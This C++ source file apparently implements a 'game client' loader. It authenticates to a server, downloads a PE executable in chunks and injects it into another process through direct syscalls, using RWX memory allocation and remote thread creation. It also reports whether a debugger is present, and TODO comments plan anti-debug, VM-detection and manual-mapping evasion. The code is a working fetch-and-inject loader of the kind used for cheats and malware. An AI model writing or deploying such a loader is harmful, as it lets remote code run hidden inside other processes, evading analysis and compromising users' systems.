#include "network.hpp"
#include "packet.hpp"
#include "crypto.hpp"
#include "compression.hpp"

#ifdef _WIN32
#include "syscalls.hpp"
#include <windows.h>
#include <tlhelp32.h>
#else
#include <unistd.h>
#endif

#include <array>
#include <vector>
#include <string>
#include <chrono>
#include <thread>
#include <iostream>
#include <ranges>
#include <algorithm>

using namespace std::chrono_literals;

namespace client {

inline constexpr std::string_view SERVER_IP = "127.0.0.1";
inline constexpr uint16_t SERVER_PORT = 8888;
inline constexpr auto CHALLENGE_TIMEOUT = 5s;

// TODO: Add heartbeat/keepalive mechanism to detect connection loss
// TODO: Add automatic reconnection with exponential backoff
// TODO: Add configurable server list (fallback servers)
// TODO: Add connection quality metrics (latency, packet loss)

class GameClient {
    net::Socket socket_;
    bool authenticated_ = false;
    std::array<uint8_t, proto::SESSION_KEY_SIZE> session_key_{};
    uint32_t current_challenge_ = 0;
    std::chrono::steady_clock::time_point challenge_time_;

    std::vector<uint8_t> pe_buffer_;
    uint32_t pe_entry_rva_ = 0;
    std::string target_process_;

    // TODO: Add last_heartbeat_ timestamp for keepalive tracking
    // TODO: Add reconnect_attempts_ counter for connection management
    // TODO: Add statistics (bytes_sent, bytes_received, packets_processed)

public:
    [[nodiscard]] auto connect() -> std::expected<void, net::Error> {
        auto result = net::connect(SERVER_IP, SERVER_PORT);
        if (!result) return std::unexpected(result.error());

        socket_ = std::move(*result);

        if (auto res = socket_.set_nonblocking(); !res) {
            return std::unexpected(res.error());
        }

        return send_connect();
    }

    void run() {
        std::array<uint8_t, 2048> buffer;

        while (socket_.valid()) {
            auto received = socket_.recv(buffer);

            if (!received) {
                if (received.error() == net::Error::WouldBlock) {
                    std::this_thread::sleep_for(10ms);
                    continue;
                }
                break;
            }

            if (*received == 0) {
                std::this_thread::sleep_for(10ms);
                continue;
            }

            process_data(std::span{buffer.data(), *received});
        }
    }

private:
    auto send_connect() -> std::expected<void, net::Error> {
        proto::Packet pkt{proto::PacketType::Connect};
        return send_packet(pkt, false);
    }

    auto send_packet(const proto::Packet& pkt, bool encrypt) -> std::expected<void, net::Error> {
        std::array<uint8_t, proto::MAX_PACKET_SIZE> buffer;
        uint16_t size = pkt.serialize(buffer);

        if (size == 0) {
            return std::unexpected(net::Error::SendFailed);
        }

        return socket_.send(std::span{buffer.data(), size}).transform([](auto) {});
    }

    void process_data(std::span<const uint8_t> data) {
        size_t offset = 0;

        while (offset < data.size()) {
            auto remaining = data.subspan(offset);
            auto packet_result = proto::Packet::deserialize(remaining);

            if (!packet_result) break;

            auto& packet = *packet_result;

            if (packet.has_flag(proto::PacketFlags::Encrypted) && authenticated_) {
                crypto::decrypt(session_key_, packet.payload_view(), packet.payload_view());
            }

            if (packet.has_flag(proto::PacketFlags::Compressed)) {
                std::array<uint8_t, proto::MAX_PAYLOAD_SIZE> decompressed;
                if (auto result = compression::RLE::decompress(packet.payload_view(),
                                                              decompressed)) {
                    std::memcpy(packet.payload.data(), decompressed.data(), *result);
                    packet.header.length = *result;
                }
            }

            handle_packet(packet);
            offset += sizeof(proto::PacketHeader) + packet.length();
        }
    }

    void handle_packet(const proto::Packet& packet) {
        using enum proto::PacketType;

        switch (packet.type()) {
            case Challenge: {
                auto* payload = packet.payload_as<proto::PayloadChallenge>();
                current_challenge_ = payload->challenge;
                challenge_time_ = std::chrono::steady_clock::now();
                send_challenge_response();
                break;
            }

            case SessionKey: {
                auto* payload = packet.payload_as<proto::PayloadSessionKey>();
                session_key_ = payload->key;
                authenticated_ = true;
                break;
            }

            case GameList: {
                auto* payload = packet.payload_as<proto::PayloadGameList>();
                handle_game_list(*payload);
                break;
            }

            case PEChunk: {
                auto* payload = packet.payload_as<proto::PayloadPEChunk>();
                handle_pe_chunk(*payload);
                break;
            }

            default:
                break;
        }
    }

    void send_challenge_response() {
        proto::Packet pkt{proto::PacketType::ChallengeResponse};
        auto* payload = pkt.payload_as<proto::PayloadChallengeResponse>();

        payload->challenge_solution = crypto::solve_challenge(current_challenge_);

        // TODO: Implement comprehensive anti-debug checks:
        //  - CheckRemoteDebuggerPresent
        //  - NtQueryInformationProcess(ProcessDebugPort)
        //  - NtSetInformationThread(ThreadHideFromDebugger)
        //  - Hardware breakpoint detection (DR0-DR7 registers)
        //
        // TODO: Implement VM detection:
        //  - CPUID checks (hypervisor bit)
        //  - VMware/VirtualBox registry keys
        //  - Timing attacks (RDTSC instruction)
        //  - MAC address vendor checks
        //
        // TODO: Add integrity checks:
        //  - Module hash verification
        //  - Import table validation
        //  - Code section checksum

#ifdef _WIN32
        payload->is_debugged = IsDebuggerPresent() ? 1 : 0;
        payload->is_vm = 0;  // Simplified
        payload->is_suspended = 0;
#else
        payload->is_debugged = 0;
        payload->is_vm = 0;
        payload->is_suspended = 0;
#endif

        pkt.set_payload(*payload);
        send_packet(pkt, false);
    }

    void handle_game_list(const proto::PayloadGameList& payload) {
        // Auto-select first game for demo
        if (payload.count > 0) {
            proto::Packet pkt{proto::PacketType::GameSelect};
            auto* select = pkt.payload_as<proto::PayloadGameSelect>();
            select->game_id = 0;
            pkt.set_payload(*select);
            send_packet(pkt, true);
        }
    }

    void handle_pe_chunk(const proto::PayloadPEChunk& payload) {
        if (payload.chunk_index == 0) {
            pe_buffer_.resize(payload.total_size);
            pe_entry_rva_ = payload.entry_rva;
        }

        size_t offset = payload.chunk_index * payload.chunk_size;
        std::memcpy(pe_buffer_.data() + offset, payload.data.data(), payload.chunk_size);

        if (payload.chunk_index == payload.total_chunks - 1) {
#ifdef _WIN32
            inject_pe();
#endif
        }
    }

#ifdef _WIN32
    void inject_pe() {
        // TODO: Implement proper process enumeration:
        //  - CreateToolhelp32Snapshot + Process32First/Process32Next
        //  - Match by process name from target_process_
        //  - Verify process architecture (x86/x64) matches PE
        //  - Check process privileges and access rights
        //
        // TODO: Add PE validation before injection:
        //  - Verify PE signature (MZ/PE headers)
        //  - Validate DOS/NT headers
        //  - Check sections alignment and RVAs
        //  - Verify imports and relocations
        //
        // TODO: Implement manual mapping:
        //  - Parse PE headers
        //  - Map sections with correct memory protection
        //  - Process relocations
        //  - Resolve imports
        //  - Call TLS callbacks
        //  - Execute DllMain or entry point

        // Use modern C++23 syscalls
        auto& mgr = shadow::SyscallManager::instance();

        // Find target process (simplified: use notepad)
        auto process_result = mgr.open_process(1234);  // Example PID
        if (!process_result) return;

        auto& process = *process_result;

        // Allocate memory
        auto base_result = mgr.allocate_memory(
            process.get(), reinterpret_cast<void*>(0x7FFF0000),
            pe_buffer_.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        ).or_else([&](auto) {
            return mgr.allocate_memory(process.get(), nullptr, pe_buffer_.size(),
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        });

        if (!base_result) return;

        // Write PE
        auto write_result = mgr.write_memory(
            process.get(), *base_result, pe_buffer_
        );

        if (!write_result) return;

        // Create thread
        auto entry = static_cast<uint8_t*>(*base_result) + pe_entry_rva_;
        auto thread_result = mgr.create_thread(process.get(), entry, *base_result);

        // Send completion
        proto::Packet pkt{proto::PacketType::PEComplete};
        auto* complete = pkt.payload_as<proto::PayloadPEComplete>();
        complete->success = thread_result.has_value() ? 1 : 0;
        complete->base_address = reinterpret_cast<uint64_t>(*base_result);
        pkt.set_payload(*complete);
        send_packet(pkt, true);
    }
#endif
};

} // namespace client

int main() {
    if (auto result = net::NetworkManager::instance().init(); !result) {
        return 1;
    }

    client::GameClient client;

    if (auto result = client.connect(); !result) {
        return 1;
    }

    client.run();

    return 0;
}
